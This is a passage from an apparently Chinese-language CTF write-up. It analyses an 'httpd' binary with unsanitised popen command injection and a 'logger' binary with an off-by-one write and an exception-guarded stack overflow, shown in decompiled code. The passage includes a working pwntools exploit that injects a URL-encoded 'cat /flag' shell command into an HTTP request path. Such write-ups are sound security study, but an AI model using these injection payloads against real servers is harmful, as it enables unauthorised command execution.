    check_canary<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序的逻辑很长，实现了一个http request parse，然后相应请求，大多数逻辑都是对http request的格式做判断，还有目录穿越的检查</p>
<p>漏洞出在这里popen这里</p>


<p>这个popen会fork一个子进程，然后调用shell，把参数传过去，也没有做过滤，所以可以通过这里执行命令</p>


<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"139.155.126.78"</span>
PORT <span class="token operator">=</span> <span class="token number">30523</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./httpd'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'GET '</span><span class="token punctuation">,</span><span class="token string">b'/cat%20%2Fflag%20%3E%20flag.txt '</span><span class="token punctuation">,</span><span class="token string">b'HTTP/1.0\r\n'</span><span class="token punctuation">,</span>
    <span class="token string">b'Host: 00.00.00.00\r\n'</span><span class="token punctuation">,</span>
    <span class="token string">b'Content-Length: 0\r\n'</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'GET '</span><span class="token punctuation">,</span><span class="token string">b'/flag.txt '</span><span class="token punctuation">,</span><span class="token string">b'HTTP/1.0\r\n'</span><span class="token punctuation">,</span>
    <span class="token string">b'Host: 00.00.00.00\r\n'</span><span class="token punctuation">,</span>
    <span class="token string">b'Content-Length: 0\r\n'</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-7Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-18h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">init_io</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  choice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
LABEL_10<span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">Trace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_10<span class="token punctuation">;</span>
      <span class="token function">warn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 <span class="token function">Trace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>
  __int16 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+26h] [rbp-Ah] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou can record log details here: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> byte_404020<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    byte_404020<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_404020<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Do you need to check the records? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%1s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">121</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>v4 <span class="token operator">==</span> <span class="token number">89</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v3 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token operator">&amp;&amp;</span> byte_404020<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> v3<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[31mRecord%d. %.16s\x1B[0m"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_404020<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">--</span>v3<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>v4 <span class="token operator">!=</span> <span class="token number">110</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>v4 <span class="token operator">!=</span> <span class="token number">78</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid input. Please enter 'y' or 'n'."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Records have been filled :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v5 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 <span class="token function">warn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _QWORD <span class="token operator">*</span>exception<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-78h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>
  __int64 v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-60h] BYREF</span>
  __int64 v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-40h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-18h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">clean_up</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4014FD</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\x1B[1;31m%s\x1B[0m\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Type your message here plz: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf<span class="token punctuation">[</span>v0 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>byte_404200<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte_404200<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> byte_404200<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
    exception <span class="token operator">=</span> <span class="token function">__cxa_allocate_exception</span><span class="token punctuation">(</span><span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>exception <span class="token operator">=</span> src<span class="token punctuation">;</span>
    <span class="token function">__cxa_throw</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">type_info</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>`typeinfo <span class="token keyword">for</span>'<span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>byte_404100<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte_404100<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4014FD</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[User input log]\nMessage: %s\nDone at %s\n"</span><span class="token punctuation">,</span> byte_404100<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401CCA</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v7 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序有两个漏洞 Trace函数循环边界没有处理好 有一个越界写的漏洞，可以把buffer overflow这个字段覆盖一部分</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000404020</span> <span class="token number">00</span> <span class="token number">0</span>A <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token operator">+</span>byte_404020 db <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>Ah<span class="token punctuation">,</span> <span class="token number">7</span>Eh <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> Trace<span class="token operator">+</span><span class="token number">58</span>↑o
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000404020</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token operator">+</span>                                        <span class="token punctuation">;</span> Trace<span class="token operator">+</span><span class="token number">9F</span>↑o
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000404020</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token operator">+</span>                                        <span class="token punctuation">;</span> Trace<span class="token operator">+</span>CE↑o
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000404020</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token operator">+</span>                                        <span class="token punctuation">;</span> Trace<span class="token operator">+</span><span class="token number">147</span>↑o
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000404020</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token operator">+</span>                                        <span class="token punctuation">;</span> Trace<span class="token operator">+</span><span class="token number">168</span>↑o
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">00000000004040</span>A0                               <span class="token punctuation">;</span> <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">00000000004040</span>A0 <span class="token number">42</span> <span class="token number">75</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">20</span> <span class="token number">4F</span> <span class="token number">76</span> <span class="token number">65</span><span class="token operator">+</span>src db <span class="token char">'Buffer Overflow'</span><span class="token punctuation">,</span><span class="token number">0</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>warn有一个栈溢出的漏洞，但是有一个输入长度的检查，如果输入长度 &gt; 0x10就会进到异常处理的逻辑然后throw一个buffer overflow的字段，由外面一层函数的catch捕获后 handler</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">warn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _QWORD <span class="token operator">*</span>exception<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-78h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>
  __int64 v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-60h] BYREF</span>
  __int64 v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-40h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-18h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
